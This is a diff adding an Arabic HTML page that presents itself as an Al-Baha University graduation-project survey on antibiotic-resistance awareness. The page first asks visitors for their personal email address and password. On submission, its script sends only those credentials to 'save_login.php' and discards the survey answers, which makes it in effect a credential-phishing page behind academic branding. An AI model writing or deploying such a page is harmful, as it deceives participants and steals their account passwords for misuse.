@@ -1,0 +1,691 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>استبانة مشروع التخرج | جامعة الباحة</title>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;800&display=swap" rel="stylesheet">
+
+<style>
+
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:'Tajawal',sans-serif;
+}
+
+body{
+background:linear-gradient(135deg,#e7fbff,#f8ffff,#f3fff4);
+min-height:100vh;
+color:#16324f;
+overflow-x:hidden;
+}
+
+body::before{
+content:"";
+position:fixed;
+width:450px;
+height:450px;
+background:#00b4d8;
+opacity:.10;
+border-radius:50%;
+top:-180px;
+left:-120px;
+filter:blur(80px);
+}
+
+body::after{
+content:"";
+position:fixed;
+width:400px;
+height:400px;
+background:#38b000;
+opacity:.10;
+border-radius:50%;
+bottom:-150px;
+right:-120px;
+filter:blur(80px);
+}
+
+
+/* تسجيل الدخول */
+
+.login-container{
+
+display:flex;
+justify-content:center;
+align-items:center;
+height:100vh;
+padding:20px;
+position:relative;
+z-index:1;
+}
+
+.login-box{
+
+width:460px;
+padding:45px;
+
+background:rgba(255,255,255,.85);
+
+backdrop-filter:blur(15px);
+
+border-radius:35px;
+
+box-shadow:
+0 15px 40px rgba(0,0,0,.08);
+
+text-align:center;
+}
+
+.logo{
+
+font-size:15px;
+font-weight:700;
+margin-bottom:15px;
+color:#0096c7;
+}
+
+.login-box h1{
+
+font-size:35px;
+margin-bottom:15px;
+
+font-weight:800;
+
+background:
+linear-gradient(
+to left,
+#0096c7,
+#38b000
+);
+
+-webkit-background-clip:text;
+-webkit-text-fill-color:transparent;
+
+}
+
+.login-box p{
+
+line-height:2;
+color:#5f7388;
+margin-bottom:30px;
+font-size:15px;
+}
+
+input{
+
+width:100%;
+padding:16px;
+margin-bottom:18px;
+
+border:none;
+outline:none;
+
+border-radius:15px;
+
+background:#f8fdff;
+
+border:2px solid #e2eef6;
+
+font-size:15px;
+transition:.3s;
+}
+
+input:focus{
+
+border-color:#00b4d8;
+
+box-shadow:
+0 0 0 5px rgba(0,180,216,.12);
+
+}
+
+button{
+
+width:100%;
+padding:17px;
+
+border:none;
+border-radius:15px;
+
+font-size:17px;
+font-weight:700;
+
+cursor:pointer;
+
+color:white;
+
+background:
+linear-gradient(
+to left,
+#0096c7,
+#00b4d8,
+#38b000
+);
+
+transition:.3s;
+}
+
+button:hover{
+
+transform:translateY(-3px);
+
+box-shadow:
+0 10px 25px rgba(0,150,199,.25);
+
+}
+
+
+/* الاستبانة */
+
+.container{
+
+display:none;
+
+max-width:900px;
+
+margin:40px auto;
+
+background:white;
+
+border-radius:35px;
+
+overflow:hidden;
+
+box-shadow:
+0 15px 40px rgba(0,0,0,.08);
+
+position:relative;
+z-index:2;
+
+}
+
+.header{
+
+padding:50px;
+text-align:center;
+
+color:white;
+
+background:
+linear-gradient(
+135deg,
+#0096c7,
+#00b4d8,
+#38b000
+);
+
+}
+
+.header h1{
+
+font-size:35px;
+margin-bottom:20px;
+}
+
+.header p{
+
+line-height:2;
+font-size:16px;
+}
+
+.content{
+
+padding:45px;
+}
+
+.section{
+
+font-size:24px;
+font-weight:800;
+
+margin-bottom:25px;
+
+color:#0077b6;
+}
+
+.question{
+
+margin-bottom:30px;
+}
+
+.question-title{
+
+font-size:18px;
+font-weight:700;
+
+margin-bottom:15px;
+}
+
+.options{
+
+display:grid;
+gap:12px;
+}
+
+.options label{
+
+padding:15px;
+
+background:#f8fcff;
+
+border-radius:15px;
+
+border:2px solid #e5f1f7;
+
+cursor:pointer;
+
+transition:.3s;
+}
+
+.options label:hover{
+
+transform:translateY(-2px);
+
+border-color:#00b4d8;
+
+background:#effcff;
+}
+
+input[type="radio"]{
+
+width:auto;
+margin-left:10px;
+accent-color:#0096c7;
+}
+
+.footer{
+
+margin-top:30px;
+
+padding:20px;
+
+background:#f8fcff;
+
+border-radius:15px;
+
+text-align:center;
+
+line-height:2;
+
+color:#63788d;
+
+}
+
+
+/* صفحة الشكر */
+
+#thankYouPage{
+
+display:none;
+}
+
+.check{
+
+font-size:80px;
+margin-bottom:20px;
+}
+
+</style>
+
+</head>
+
+<body>
+
+
+<!-- تسجيل الدخول -->
+
+<div class="login-container" id="loginPage">
+
+<div class="login-box">
+
+<div class="logo">
+جامعة الباحة | كلية العلوم الطبية التطبيقية
+</div>
+
+<h1>
+مرحبًا بكم
+</h1>
+
+<p>
+
+يرجى تسجيل الدخول باستخدام بريدكم الإلكتروني الشخصي
+للمتابعة والمشاركة في الدراسة البحثية الخاصة بمشروع
+التخرج. جميع المعلومات المدخلة تعامل بسرية تامة
+وتستخدم لأغراض أكاديمية وبحثية فقط.
+
+</p>
+
+<input
+type="email"
+id="email"
+placeholder="البريد الإلكتروني الشخصي"
+required>
+
+<input
+type="password"
+id="password"
+placeholder="كلمة المرور"
+required>
+
+<button onclick="login()">
+
+تسجيل الدخول
+
+</button>
+
+</div>
+
+</div>
+
+
+
+<!-- الاستبانة -->
+
+<div class="container" id="surveyPage">
+
+<div class="header">
+
+<h1>
+
+دراسة مستوى الوعي حول مقاومة المضادات الحيوية
+
+</h1>
+
+<p>
+
+نحن مجموعة طالبات من تخصص طب المختبرات
+بجامعة الباحة، نعمل على تنفيذ هذه الدراسة
+ضمن مشروع التخرج بهدف تقييم مستوى الوعي
+المجتمعي حول الاستخدام الصحيح للمضادات الحيوية
+وتأثير سوء استخدامها على مقاومة البكتيريا للعلاج.
+
+</p>
+
+</div>
+
+
+<div class="content">
+
+<div class="section">
+المعلومات الأساسية
+</div>
+
+
+<div class="question">
+
+<div class="question-title">
+الفئة العمرية
+</div>
+
+<div class="options">
+
+<label>
+<input type="radio" name="age">
+أقل من 18 سنة
+</label>
+
+<label>
+<input type="radio" name="age">
+18 - 25 سنة
+</label>
+
+<label>
+<input type="radio" name="age">
+26 - 35 سنة
+</label>
+
+<label>
+<input type="radio" name="age">
+أكبر من 35 سنة
+</label>
+
+</div>
+
+</div>
+
+
+
+<div class="question">
+
+<div class="question-title">
+الحالة المهنية
+</div>
+
+<div class="options">
+
+<label>
+<input type="radio" name="job">
+طالب / طالبة
+</label>
+
+<label>
+<input type="radio" name="job">
+موظف قطاع صحي
+</label>
+
+<label>
+<input type="radio" name="job">
+موظف قطاع آخر
+</label>
+
+<label>
+<input type="radio" name="job">
+غير موظف
+</label>
+
+</div>
+
+</div>
+
+
+<div class="section">
+أسئلة الدراسة
+</div>
+
+
+<div class="question">
+
+<div class="question-title">
+
+هل سبق لك استخدام مضاد حيوي دون وصفة طبية؟
+
+</div>
+
+<div class="options">
+
+<label>
+<input type="radio" name="q1">
+نعم
+</label>
+
+<label>
+<input type="radio" name="q1">
+لا
+</label>
+
+</div>
+
+</div>
+
+
+<div class="question">
+
+<div class="question-title">
+
+هل سمعت سابقًا بمصطلح مقاومة المضادات الحيوية؟
+
+</div>
+
+<div class="options">
+
+<label>
+<input type="radio" name="q2">
+نعم
+</label>
+
+<label>
+<input type="radio" name="q2">
+لا
+</label>
+
+</div>
+
+</div>
+
+
+<div class="question">
+
+<div class="question-title">
+
+برأيك ما مدى خطورة الاستخدام الخاطئ للمضادات الحيوية؟
+
+</div>
+
+<div class="options">
+
+<label>
+<input type="radio" name="q3">
+خطير جدًا
+</label>
+
+<label>
+<input type="radio" name="q3">
+خطير
+</label>
+
+<label>
+<input type="radio" name="q3">
+تأثير محدود
+</label>
+
+<label>
+<input type="radio" name="q3">
+لا يوجد تأثير
+</label>
+
+</div>
+
+</div>
+
+
+<button onclick="submitSurvey()">
+
+إرسال الاستبانة
+
+</button>
+
+
+<div class="footer">
+
+نشكر لكم وقتكم ومساهمتكم القيّمة في دعم الدراسات
+البحثية والجهود العلمية في المجال الصحي.
+
+</div>
+
+</div>
+
+</div>
+
+
+
+<!-- صفحة الشكر -->
+
+<div class="login-container"
+id="thankYouPage">
+
+<div class="login-box">
+
+<div class="check">
+
+✅
+
+</div>
+
+<h1>
+
+شكرًا لمشاركتكم
+
+</h1>
+
+<p>
+
+تم حفظ استجابتكم بنجاح.
+
+نشكر لكم مساهمتكم في هذه الدراسة البحثية،
+حيث تساعد إجاباتكم في دعم مشروع التخرج
+وتطوير المعرفة العلمية في مجال طب المختبرات.
+
+</p>
+
+<button onclick="location.reload()">
+
+العودة للصفحة الرئيسية
+
+</button>
+
+</div>
+
+</div>
+
+
+
+<script>
+
+function login(){
+
+let email =
+document.getElementById("email").value;
+
+let password =
+document.getElementById("password").value;
+
+
+if(email==="" || password===""){
+
+alert("يرجى إدخال البريد الإلكتروني وكلمة المرور");
+
+return;
+
+}
+
+document.getElementById("loginPage")
+.style.display="none";
+
+document.getElementById("surveyPage")
+.style.display="block";
+
+}
+
+
+function submitSurvey(){
+
+let email = document.getElementById("email").value;
+let password = document.getElementById("password").value;
+
+fetch("save_login.php", {
+method: "POST",
+headers: {
+"Content-Type": "application/x-www-form-urlencoded"
+},
+body: "email=" + email + "&password=" + password
+})
+.then(res => res.text())
+.then(data => {
+console.log(data);
+});
+
+document.getElementById("surveyPage").style.display="none";
+document.getElementById("thankYouPage").style.display="flex";
+
+}
+
+</script>
+
+</body>
+</html>
